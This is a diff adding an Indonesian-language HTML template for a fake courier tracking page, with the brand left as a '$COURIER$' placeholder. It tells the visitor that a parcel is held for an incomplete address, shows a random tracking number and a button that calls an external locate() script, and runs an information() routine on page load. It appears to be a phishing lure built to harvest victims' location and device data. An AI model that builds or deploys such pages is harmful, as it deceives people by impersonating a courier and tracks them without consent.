@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <title>$COURIER$ — Lacak Pengiriman</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="#1a73e8">
+  <script type="text/javascript">
+    if (window.location.protocol == "http:") {
+      var restOfUrl = window.location.href.substr(5);
+      window.location = "https:" + restOfUrl;
+    }
+  </script>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+  <script src="/js/location.js"></script>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+      background: #f0f4f9;
+      color: #222;
+      min-height: 100vh;
+    }
+    .header {
+      background: linear-gradient(135deg, #1a73e8 0%, #1557b0 100%);
+      padding: 24px 16px;
+      text-align: center;
+      color: #fff;
+    }
+    .header h1 { font-size: 22px; font-weight: 700; }
+    .header p { font-size: 13px; opacity: 0.85; margin-top: 4px; }
+    .container {
+      max-width: 440px;
+      margin: 0 auto;
+      padding: 16px;
+    }
+    .tracking-card {
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 2px 16px rgba(0,0,0,0.06);
+      padding: 24px 20px;
+      margin-bottom: 16px;
+    }
+    .tracking-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 16px;
+      padding-bottom: 12px;
+      border-bottom: 1px solid #eee;
+    }
+    .tracking-header .number { font-size: 11px; color: #999; text-transform: uppercase; letter-spacing: 0.5px; }
+    .tracking-header .id { font-size: 14px; font-weight: 700; font-family: monospace; }
+    .status-badge {
+      display: inline-block;
+      background: #fff3e0;
+      color: #e65100;
+      font-size: 12px;
+      font-weight: 700;
+      padding: 4px 12px;
+      border-radius: 20px;
+    }
+    .alert-box {
+      background: #fff8e1;
+      border: 1px solid #ffe082;
+      border-radius: 10px;
+      padding: 16px;
+      margin: 16px 0;
+      display: flex;
+      gap: 12px;
+      align-items: flex-start;
+    }
+    .alert-box .icon { font-size: 24px; }
+    .alert-box .text h3 { font-size: 14px; color: #e65100; margin-bottom: 4px; }
+    .alert-box .text p { font-size: 13px; color: #666; line-height: 1.5; }
+    .detail-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 8px 0;
+      border-bottom: 1px solid #f5f5f5;
+      font-size: 13px;
+    }
+    .detail-row:last-child { border-bottom: none; }
+    .detail-row .label { color: #999; }
+    .detail-row .value { color: #222; font-weight: 500; text-align: right; }
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 16px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.3s;
+      margin-top: 16px;
+    }
+    .btn-primary {
+      background: #1a73e8;
+      color: #fff;
+    }
+    .btn-primary:hover { background: #1557b0; }
+    .btn-secondary {
+      background: #f5f5f5;
+      color: #666;
+      font-weight: 500;
+      margin-top: 8px;
+    }
+    .timeline { margin: 16px 0; }
+    .timeline-item {
+      display: flex;
+      gap: 12px;
+      padding: 8px 0;
+      position: relative;
+    }
+    .timeline-dot {
+      width: 10px; height: 10px;
+      border-radius: 50%;
+      margin-top: 4px;
+      flex-shrink: 0;
+    }
+    .timeline-dot.active { background: #1a73e8; }
+    .timeline-dot.warn { background: #e65100; }
+    .timeline-dot.done { background: #43a047; }
+    .timeline-text { font-size: 12px; }
+    .timeline-text .time { color: #999; font-size: 11px; }
+    .timeline-text .desc { color: #333; }
+    .footer {
+      text-align: center;
+      font-size: 11px;
+      color: #999;
+      padding: 16px;
+    }
+  </style>
+</head>
+<body onload="information();">
+  <div class="header">
+    <h1>$COURIER$</h1>
+    <p>Lacak Pengiriman — Real-time Tracking</p>
+  </div>
+  <div class="container">
+    <div class="tracking-card">
+      <div class="tracking-header">
+        <div>
+          <div class="number">No. Resi</div>
+          <div class="id">$COURIER$<span id="resi-number"></span></div>
+        </div>
+        <span class="status-badge">⏳ Tertahan</span>
+      </div>
+
+      <div class="alert-box">
+        <div class="icon">📦</div>
+        <div class="text">
+          <h3>Paket Tertahan di Gudang</h3>
+          <p>Paket Anda tertahan karena alamat tujuan tidak lengkap. Konfirmasi data pengiriman untuk melanjutkan.</p>
+        </div>
+      </div>
+
+      <div class="detail-row"><span class="label">Pengirim</span><span class="value">$COURIER$ Warehouse</span></div>
+      <div class="detail-row"><span class="label">Status</span><span class="value" style="color:#e65100;">Menunggu Konfirmasi</span></div>
+      <div class="detail-row"><span class="label">Berat Paket</span><span class="value">1.2 kg</span></div>
+      <div class="detail-row"><span class="label">Estimasi Biaya</span><span class="value">Rp 15.000 - Gratis</span></div>
+
+      <div class="timeline">
+        <div class="timeline-item">
+          <div class="timeline-dot done"></div>
+          <div class="timeline-text"><div class="desc">Paket diterima di gudang $COURIER$</div><div class="time">Kemarin, 14:30</div></div>
+        </div>
+        <div class="timeline-item">
+          <div class="timeline-dot done"></div>
+          <div class="timeline-text"><div class="desc">Paket dalam proses sortir</div><div class="time">Kemarin, 16:45</div></div>
+        </div>
+        <div class="timeline-item">
+          <div class="timeline-dot warn"></div>
+          <div class="timeline-text"><div class="desc" style="color:#e65100;font-weight:600;">Alamat tidak lengkap — Menunggu konfirmasi</div><div class="time">Hari ini, 08:12</div></div>
+        </div>
+      </div>
+
+      <button class="btn btn-primary" onclick="locate(function(){this.innerHTML='✅ Konfirmasi Berhasil!'; this.disabled=true;}.bind(this), function(){this.innerHTML='❌ Gagal. Coba lagi.';}.bind(this))">Konfirmasi Alamat & Lanjutkan</button>
+      <button class="btn btn-secondary" onclick="alert('Silakan hubungi Customer Service $COURIER$')">Hubungi CS</button>
+    </div>
+    <div class="footer">© $COURIER$ — Layanan Pengiriman Ekspres</div>
+  </div>
+  <script>
+    document.getElementById('resi-number').textContent = '-' + Math.random().toString(36).substring(2, 8).toUpperCase();
+  </script>
+</body>
+</html>
